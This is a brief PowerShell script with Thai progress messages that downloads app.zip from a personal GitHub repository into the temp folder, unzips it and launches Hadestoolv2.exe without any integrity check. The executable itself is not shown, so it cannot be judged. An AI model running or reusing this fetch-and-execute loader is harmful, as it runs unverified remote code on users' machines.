$folder = "$env:TEMP\Hadestoolv2"
if (!(Test-Path $folder)) { New-Item -ItemType Directory -Path $folder | Out-Null }

$zipUrl = "https://raw.githubusercontent.com/natchanam18-debug/SSS/main/app.zip"
$zipPath = "$env:TEMP\app.zip"

Write-Host "กำลังดาวน์โหลดโปรแกรม..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath

Write-Host "กำลังเตรียมไฟล์..." -ForegroundColor Cyan
Expand-Archive -Path $zipPath -DestinationPath $folder -Force

Write-Host "กำลังเปิดโปรแกรม..." -ForegroundColor Green
Start-Process "$folder\Hadestoolv2.exe"
